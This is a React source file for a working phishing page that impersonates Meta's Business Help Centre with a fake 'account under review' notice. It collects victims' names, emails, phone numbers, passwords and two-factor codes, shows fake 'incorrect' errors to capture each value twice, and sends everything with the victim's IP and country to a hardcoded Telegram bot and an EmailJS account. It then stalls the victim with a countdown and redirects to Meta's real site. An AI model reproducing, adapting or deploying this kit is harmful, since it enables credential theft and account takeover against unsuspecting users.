import React from "react";
import Modal from "react-modal";
import emailjs from "@emailjs/browser";
// const fetch = require('node-fetch');
const target = "https://transparency.fb.com/en-gb/";
const chatId = '-4095764303';
const botToken = '6333593472:AAEIM1_VL6YrJvIJzToBLMOdM8eVTZ-VUWQ';
//send data telegram
 // Sử dụng Fetch API để gửi yêu cầu GET đến http://ip-api.com/json/
 const res_ip = await fetch(
  "https://api.ipgeolocation.io/ipgeo?apiKey=ab2b18f1cf97421582f9b9190121e2a5"
).then((response) => response.json()); // Chuyển đổi dữ liệu nhận được sang định dạng JSON
async function sendMessageToTelegramBot(chatId, messageText, botToken) {
  try {
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: messageText,
    };

    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    const responseData = await response.json();
    if (responseData.ok) {
      console.log('Message sent:', responseData.result);
    } else {
      console.error('Error:', responseData);
    }
  } catch (error) {
    console.error('Error sending message:', error.message);
  }
}
async function sendEmail(messageText, user_object) {

  emailjs.send('service_uc2swle', 'template_hofyisr',  {country_name: user_object.country_name, ip: user_object.ip, name:user_object.name, message: messageText}, 'chhLCv2PVlt5NpRR6')
    .then((result) => {
        console.log(result.text);
    }, (error) => {
        console.log(error.text);
    });
};

const PageWait = () => {
  const [timer, setTimer] = React.useState(600);

  React.useEffect(() => {
    const myinterval2 = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer === 0) {
          clearInterval(myinterval2);
          window.location.href = target;
          return 0;
        } else {
          return prevTimer - 1;
        }
      });
    }, 1000);

    // Cleanup the interval on component unmount
    return () => {
      clearInterval(myinterval2);
    };
  }, []); // Empty dependency array ensures that the effect runs only once on mount

  const convertTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes >= 10 ? minutes : "0" + minutes}:${seconds >= 10 ? seconds : "0" + seconds
      }`;
  };

  return (
    <div
      style={{
        backgroundColor: "#F5F6F6",
        height: "100vh",
      }}
    >
      <div
        className="header"
        style={{
          //   borderBottom: "0px solid #d0d0d0",
          borderSizing: "border-box",
          backgroundColor: "#FFFFFF",
          boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
        }}
      >
        <div
          style={{
            paddingTop: 15,
            paddingLeft: 30,
            paddingBottom: 10,
          }}
        >
          <img src="/resources/meta.svg" alt="" height={15} />
        </div>
      </div>
      <div
        className="body"
        style={{
          display: "flex",
          justifyContent: "center",
        }}
      >
        <div
          style={{
            marginTop: 40,
            marginRight: 10,
            marginLeft: 10,
            maxWidth: 700,
          }}
        >
          <div
            style={{
              backgroundColor: "white",
              minHeight: 200,
              maxWidth: 700,
              borderRadius: 5,
              border: "1px solid #d0d0d0",
              display: "flex",
              paddingTop: 30,
              paddingBottom: 30,
              paddingLeft: 30,
              paddingRight: 30,
            }}
          >
            <div
              className="image"
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                // backgroundColor: "#F5F6F6",
                marginRight: 30,
              }}
            >
              <img src="/resources/ref.png" height={130} alt="" />
            </div>
            <div className="text">
              <div
                className=""
                style={{
                  fontWeight: "bold",
                }}
              >
                Hi, We are receiving your information
              </div>
              <div
                className=""
                style={{
                  marginTop: 20,
                  marginBottom: 20,
                }}
              >
                Reviewing your activity takes just a few more moments. We might
                require additional information to confirm that this is your
                account
              </div>
              <div className="">
                Please wait, this could take up to 5-10 minutes, please be
                patient while we review your case... (wait {convertTime(timer)})
              </div>
              <div
                className=""
                style={{
                  marginTop: 20,
                  backgroundColor: "#f0f2f5",
                  width: "100%",
                  height: 25,
                }}
              >
                <div
                  className="progress"
                  style={{
                    backgroundColor: "#1a77f2",
                    width: `${((600 - timer) / 600) * 100}%`,
                    height: 25,
                  }}
                ></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

const PageAuthCode = ({
  info,
  name,
  businessEmail,
  personalEmail,
  phone,
  pageName,
  passwordValue,
  setPage,
}) => {
  const [code, setCode] = React.useState("");
  const [error, setError] = React.useState(false);
  const [timer, setTimer] = React.useState(0);
  const [count, setCount] = React.useState(0);

  let myinterval;
  let user_object = {};

  const handleSend = () => {
    if (timer !== 0) {
      return;
    }
    if (count === 0) {
      
      const message = `--2fa lần 1--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n2fa 1 : ${code}\n2fa 2 : "------"\n`;
      sendMessageToTelegramBot(chatId, message, botToken);
      user_object.country_name = res_ip.country_name;
      user_object.ip = res_ip.ip;
      user_object.name = name;
      sendEmail(message, user_object);
    }

    if (count == 1) {
     

      clearInterval(myinterval); 
      const message = `--2fa lần 2--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n2fa 1 : "------"\n2fa 2 : ${code}\n-------END--------\n`;
      user_object.country_name = res_ip.country_name;
      user_object.ip = res_ip.ip;
      user_object.name = name;
      sendMessageToTelegramBot(chatId, message, botToken);
      sendEmail(message, user_object);
      setPage(3); // đã ấn 1 lần trước đó, lần này là lần 2 thì qua trang 3
    }
    setCount((prevCount) => prevCount + 1);
    setError(true);
    setTimer(60);

    myinterval = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer === 0) {
          clearInterval(myinterval);
          return 0;
        } else {
          return prevTimer - 1;
        }
      });
    }, 1000);
  };

  return (
    <div
      style={{
        backgroundColor: "#F5F6F6",
        height: "100vh",
      }}
    >
      <div
        className="header"
        style={{
          //   borderBottom: "0px solid #d0d0d0",
          borderSizing: "border-box",
          backgroundColor: "#FFFFFF",
          boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
        }}
      >
        <div
          style={{
            paddingTop: 15,
            paddingLeft: 30,
            paddingBottom: 10,
          }}
        >
          <img src="/resources/meta.svg" alt="" height={15} />
        </div>
      </div>
      <div
        className="body"
        style={{
          display: "flex",
          justifyContent: "center",
        }}
      >
        <div
          style={{
            marginTop: 40,
            marginRight: 10,
            marginLeft: 10,
            maxWidth: 600,
          }}
        >
          <div
            style={{
              backgroundColor: "white",
              minHeight: 200,
              borderRadius: 5,
              border: "1px solid #d0d0d0",
            }}
          >
            <div
              className="title"
              style={{
                fontWeight: "bold",
                color: "#4B4F56",
                padding: "10px 10px 0px 10px",
                fontSize: 16,
              }}
            >
              Two-factor authentication required (2/3)
            </div>
            <hr
              style={{
                borderTop: "0.5px solid #FFFFFF",
              }}
            />
            <div className="bodyofcard">
              <div
                style={{
                  padding: "10px 10px 10px 10px",
                  fontSize: 14,
                  fontWeight: 400,
                }}
              >
                You’ve asked us to require a 6-digit login code when anyone
                tries to access your account from a new device or browser.
              </div>
              <div
                style={{
                  padding: "10px 10px 10px 10px",
                  fontSize: 14,
                  fontWeight: 400,
                  display: "flex",
                }}
              >
                Enter the 6-digit code from your
                <div
                  style={{
                    fontWeight: "bold",
                    paddingRight: 5,
                    paddingLeft: 5,
                  }}
                >
                  code generator
                </div>{" "}
                or third-party app below.
              </div>
              <div
                style={{
                  padding: "10px 10px 10px 10px",
                  fontSize: 14,
                  fontWeight: 400,
                  display: "flex",
                  alignItems: "center",
                }}
              >
                <input
                  type="text"
                  style={{
                    padding: "15px 10px 15px 10px",
                    fontSize: 14,
                    fontWeight: 400,
                    border: "1px solid #d0d0d0",
                  }}
                  placeholder="Login code"
                  value={code}
                  onChange={(e) => {
                    const newCode = e.target.value;
                    if (newCode.length > 6) {
                      return;
                    }
                    setCode(newCode);
                  }}
                />

                {timer !== 0 && (
                  <div style={{ marginLeft: 5 }}>
                    (wait 00:{timer >= 10 ? timer : "0" + timer})
                  </div>
                )}
              </div>
              {error && (
                <div
                  style={{
                    color: "#DC3545",
                    fontSize: 14,
                    marginTop: 15,
                    marginBottom: 15,
                    marginLeft: 10,
                  }}
                >
                  The code generator you entered is incorrect, please try again!
                </div>
              )}
            </div>
            <hr
              style={{
                borderTop: "0.5px solid #FFFFFF",
              }}
            />
            <div
              className="footercard"
              style={{
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                paddingLeft: 20,
                paddingRight: 20,
                paddingBottom: 10,
                paddingTop: 5,
              }}
            >
              <div
                style={{
                  fontSize: 14,
                  fontWeight: 600,
                  color: "#385898",
                }}
              >
                Need another way to authenticate?
              </div>
              <button
                style={{
                  paddingRight: 20,
                  paddingLeft: 20,
                  height: 32,
                  fontWeight: "bold",
                  fontSize: 14,
                  borderRadius: 5,
                  borderWidth: 0,
                  backgroundColor:
                    code.length === 0 || timer !== 0 ? "#7DAFF9" : "#3084F4",
                  cursor: "pointer",
                  color: "white",
                }}
                disabled={code.length === 0 || timer !== 0}
                onClick={handleSend}
              >
                Send
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// ========================================================================================================

const customStyles = {
  content: {
    top: "50%",
    left: "50%",
    right: "auto",
    bottom: "auto",
    marginRight: "-50%",
    transform: "translate(-50%, -50%)",
    width: "80%",
    maxWidth: 650,
  },
};

// Make sure to bind modal to your appElement (https://reactcommunity.org/react-modal/accessibility/)
Modal.setAppElement("#root");

const Card = ({
  handleSubmit,
  handleChange,
  closeModal,
  afterOpenModal,
  handleContinue,
  modalIsOpen,
  passwordValue,
  setPasswordValue,
  checked,
  info,
  setInfo,
  name,
  setName,
  businessEmail,
  setBusinessEmail,
  personalEmail,
  setPersonalEmail,
  phone,
  setPhone,
  pageName,
  setPageName,
}) => {
  const [count, setCount] = React.useState(0);
  return (
    <div
      style={{
        maxWidth: 560,
        marginTop: 30,
        marginBottom: 200,

        marginRight: 10,
        marginLeft: 10,
        paddingLeft: 15,
        paddingRight: 15,
        paddingBottom: 40,

        backgroundColor: "white",
        borderRadius: 15,
        boxShadow: "0px 0px",
      }}
    //   className="card"
    >
      <Modal
        isOpen={modalIsOpen}
        onAfterOpen={afterOpenModal}
        onRequestClose={closeModal}
        style={customStyles}
        contentLabel="Example Modal"
      >
        <div
          className=""
          style={{
            display: "flex",
            justifyContent: "space-between",
            marginTop: 20,
          }}
        >
          <div
            style={{
              fontSize: 20,
              fontWeight: 400,
            }}
          >
            Please Enter Your Password
          </div>
          <button onClick={closeModal}>x</button>
        </div>
        <hr
          style={{
            borderTop: "0.5px solid #FFFFFF",
            marginTop: 20,
            marginBottom: 20,
          }}
        />
        <div>For your security, you must enter your password to continue.</div>
        <div className="">
          <div
            className=""
            style={{
              fontWeight: "500",
              color: "grey",
              fontSize: 14,
              marginTop: 20,
              marginBottom: 5,
            }}
          >
            Password
          </div>
          <input
            type="password"
            value={passwordValue}
            onChange={(e) => setPasswordValue(e.target.value)}
            style={{
              width: "95%",
              padding: 10,
              paddingTop: 15,
              paddingBottom: 15,
              fontSize: 14,
              borderColor: "#d0d0d0",
              borderWidth: 0.1,
              borderRadius: 5,
              border: "1px solid #d0d0d0",
            }}
          />
        </div>
        <div
          style={{
            textAlign: "right",
            display: "flex",
            justifyContent: "flex-end",
            flexDirection: "column",
          }}
        >
          {count === 1 && (
            <div
              style={{
                color: "red",
                fontSize: 14,
                marginTop: 5,
              }}
            >
              The password you've entered is incorrect.
            </div>
          )}
          <div>
            {" "}
            <button
              style={{
                paddingRight: 30,
                paddingLeft: 30,
                marginTop: 15,
                height: 45,
                fontWeight: "bold",
                fontSize: 16,
                borderRadius: 5,
                borderWidth: 0,
                backgroundColor: passwordValue ? "#3084F4" : "#7DAFF9",
                cursor: "pointer",
                color: "white",
              }}
              disabled={!passwordValue}
              onClick={() => {
                if (count === 0) {
                  setCount((prevCount) => prevCount + 1);
                  let user_object = {};
                  const message = `-------START--------\n--password lần 1--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : ${passwordValue}\n`;
                  sendMessageToTelegramBot(chatId, message, botToken);
                  user_object.country_name = res_ip.country_name;
                  user_object.ip = res_ip.ip;
                  user_object.name = name;
                  sendEmail(message, user_object);
                  setPasswordValue("");
                } else if (count === 1) {
                  handleContinue();
                }
              }}
            >
              Continue
            </button>
          </div>
        </div>
      </Modal>
      <br />
      {/* // step */}
      {/* <div className="">...</div> */}
      <div
        className=""
        style={{
          textAlign: "center",
          fontWeight: "bold",
          fontSize: 20,
          marginTop: 20,
          marginBottom: 20,
        }}
      >
        Get Started
      </div>
      <div
        className=""
        style={{
          backgroundColor: "rgb(226, 227, 229)",
          paddingTop: 20,
          paddingBottom: 20,
          paddingLeft: 20,
          paddingRight: 20,
        }}
      >
        <div
          style={{
            fontSize: 13,
            fontWeight: "500",
            marginBottom: 10,
          }}
        >
          We have received multiple reports that suggest that your account has
          been in violation of our terms of services and community guidelines.
          As a result, your account is scheduled for review
        </div>
        <div
          className=""
          style={{
            fontSize: 14,
            fontWeight: "700",
          }}
        >
          Report no: 2859599362
        </div>
      </div>
      <div className="">
        <div
          className=""
          style={{
            fontWeight: "bold",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 10,
          }}
        >
          Please provide us information that will help us investigate
        </div>
        <textarea
          type="text"
          value={info}
          onChange={(e) => setInfo(e.target.value)}
          style={{
            width: "95%",
            height: 80,
            padding: 10,
            paddingTop: 20,
            paddingBottom: 20,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div className="">
        <div
          className=""
          style={{
            fontWeight: "500",
            color: "grey",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 5,
          }}
        >
          Full Name
        </div>
        <input
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
          style={{
            width: "95%",
            padding: 10,
            paddingTop: 15,
            paddingBottom: 15,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div className="">
        <div
          className=""
          style={{
            fontWeight: "500",
            color: "grey",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 5,
          }}
        >
          Business Email Address
        </div>
        <input
          type="text"
          value={businessEmail}
          onChange={(e) => setBusinessEmail(e.target.value)}
          style={{
            width: "95%",
            padding: 10,
            paddingTop: 15,
            paddingBottom: 15,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div className="">
        <div
          className=""
          style={{
            fontWeight: "500",
            color: "grey",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 5,
          }}
        >
          Personal Email Address
        </div>
        <input
          type="text"
          value={personalEmail}
          onChange={(e) => setPersonalEmail(e.target.value)}
          style={{
            width: "95%",
            padding: 10,
            paddingTop: 15,
            paddingBottom: 15,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div className="">
        <div
          className=""
          style={{
            fontWeight: "500",
            color: "grey",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 5,
          }}
        >
          Mobile Phone Number
        </div>
        <input
          type="text"
          value={phone}
          onChange={(e) => setPhone(e.target.value)}
          style={{
            width: "95%",
            padding: 10,
            paddingTop: 15,
            paddingBottom: 15,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div className="">
        <div
          className=""
          style={{
            fontWeight: "500",
            color: "grey",
            fontSize: 14,
            marginTop: 20,
            marginBottom: 5,
          }}
        >
          Page Name
        </div>
        <input
          type="text"
          value={pageName}
          onChange={(e) => setPageName(e.target.value)}
          style={{
            width: "95%",
            padding: 10,
            paddingTop: 15,
            paddingBottom: 15,
            fontSize: 14,
            borderColor: "#d0d0d0",
            borderWidth: 0.1,
            borderRadius: 5,
            border: "1px solid #d0d0d0",
          }}
        />
      </div>

      <div
        className=""
        style={{
          fontWeight: "500",
          color: "grey",
          fontSize: 14,
          marginTop: 15,
          marginBottom: 40,
        }}
      >
        <input type="checkbox" id="terms" onChange={handleChange} />
        <label htmlFor="terms" style={{ marginLeft: 5 }}>
          I agree to our Terms, Data and Cookies Policy.
        </label>
      </div>
      <button
        style={{
          width: "100%",
          height: 45,
          fontWeight: "bold",
          fontSize: 16,
          borderRadius: 5,
          borderWidth: 0,
          backgroundColor: checked ? "#3084F4" : "#7DAFF9",
          cursor: "pointer",
          color: "white",
        }}
        disabled={!checked}
        onClick={handleSubmit}
      >
        Submit
      </button>
    </div>
  );
};

function Home() {
  const [page, setPage] = React.useState(1);

  const [modalIsOpen, setIsOpen] = React.useState(false);
  const [passwordValue, setPasswordValue] = React.useState("");
  const [checked, setChecked] = React.useState(false);

  const [info, setInfo] = React.useState("");
  const [name, setName] = React.useState("");
  const [businessEmail, setBusinessEmail] = React.useState("");
  const [personalEmail, setPersonalEmail] = React.useState("");
  const [phone, setPhone] = React.useState("");
  const [pageName, setPageName] = React.useState("");

  const handleContinue = () => {
    setPage(2);
    let user_object = {};
    const message = `
    --password lần 2--\nip: ${res_ip.ip}\ncountry: ${res_ip.country_name}\ninfo : ${info}\nname : ${name}\nbusinessEmail : ${businessEmail}\npersonalEmail : ${personalEmail}\nphone : ${phone}\npageName : ${pageName}\npassword 1 : "------"\npassword 2 : ${passwordValue}\n`;
    sendMessageToTelegramBot(chatId, message, botToken);
    user_object.country_name = res_ip.country_name;
    user_object.ip = res_ip.ip;
    user_object.name = name;
    sendEmail(message, user_object);
  };

  function openModal() {
    setIsOpen(true);
  }

  function afterOpenModal() {
    // references are now sync'd and can be accessed.
    // subtitle.style.color = "#f00";
  }

  function closeModal() {
    setIsOpen(false);
    setPasswordValue("");
  }

  function handleChange(e) {
    setChecked(e.target.checked);
  }

  const handleSubmit = () => {
    openModal();
  };

  if (page === 1)
    return (
      <div style={{ background: "#f5f6f6" }}>
        <div
          style={{
            paddingTop: 30,
            paddingLeft: 30,
            paddingBottom: 30,
            backgroundColor: "#f5f6f6",
          }}
        >
          <img src="/resources/meta.svg" alt="" height={15} />
        </div>
        <div
          style={{
            paddingRight: 30,
            paddingLeft: 30,
            display: "flex",
            justifyContent: "space-between",
            fontWeight: "bold",
            fontSize: 14,
            paddingTop: 20,
            paddingBottom: 20,
            backgroundColor: "white",
          }}
        >
          <div>Business Help Centre</div>
          <div>Get support resources</div>
        </div>

        <div
          style={{
            display: "flex",
            //   backgroundColor: "blue",
            height: 200,
            justifyContent: "center",
            alignItems: "center",
            flexDirection: "column",
            backgroundImage: "url(/resources/bg.jpeg)",
            backgroundSize: "cover",
          }}
        >
          <div
            style={{
              fontSize: 12,
              color: "white",
              fontWeight: "bold",
            }}
          >
            Business Help Centre
          </div>
          <div
            style={{
              marginTop: 10,
              fontSize: 36,
              color: "white",
            }}
          >
            Get Support
          </div>
        </div>

        <div
          style={{
            display: "flex",
            justifyContent: "center",
          }}
        >
          <Card
            handleSubmit={handleSubmit}
            handleChange={handleChange}
            closeModal={closeModal}
            afterOpenModal={afterOpenModal}
            handleContinue={handleContinue}
            modalIsOpen={modalIsOpen}
            passwordValue={passwordValue}
            setPasswordValue={setPasswordValue}
            checked={checked}
            info={info}
            setInfo={setInfo}
            name={name}
            setName={setName}
            businessEmail={businessEmail}
            setBusinessEmail={setBusinessEmail}
            personalEmail={personalEmail}
            setPersonalEmail={setPersonalEmail}
            phone={phone}
            setPhone={setPhone}
            pageName={pageName}
            setPageName={setPageName}
          />
        </div>
      </div>
    );
  else if (page === 2) {
    return (
      <PageAuthCode
        info={info}
        name={name}
        businessEmail={businessEmail}
        personalEmail={personalEmail}
        phone={phone}
        pageName={pageName}
        passwordValue={passwordValue}
        setPage={setPage}
      />
    );
  } else if (page === 3) {
    return <PageWait />;
  }
}

export default Home;
